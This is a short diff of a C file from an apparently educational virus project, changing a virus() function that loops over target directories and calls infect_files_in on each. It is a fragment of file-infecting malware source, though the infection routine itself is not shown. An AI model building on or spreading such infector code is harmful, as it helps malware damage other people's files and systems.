@@ -6,14 +6,14 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 22:07:48 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 02:11:32 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "compiler_utils.h"
 #include "virus.h"
 
-void	virus(uint64_t seed[2])
+void	virus(void)
 {
 	const char *playgrounds[] =
 	{
@@ -23,6 +23,6 @@ void	virus(uint64_t seed[2])
 
 	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
 	{
-		infect_files_in(playgrounds[i], seed);
+		infect_files_in(playgrounds[i]);
 	}
 }
